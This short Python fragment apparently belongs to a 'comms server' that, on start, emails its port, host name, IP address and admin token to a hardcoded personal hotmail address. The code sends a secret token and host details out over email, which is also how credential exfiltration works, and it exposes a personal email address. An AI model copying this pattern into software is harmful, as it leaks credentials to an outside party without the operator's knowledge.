...
def main():
	...
	email.To = "tiagofonseca2002@hotmail.com"
	email.Subject = "Comms Server Initiated"
	email.HTMLBody = "PORT: " + str(port) + "<br>HOST: "+host_name+"<br>IP: "+host_ip+"<br>ADMIN TOKEN: "+token
	email.Send()
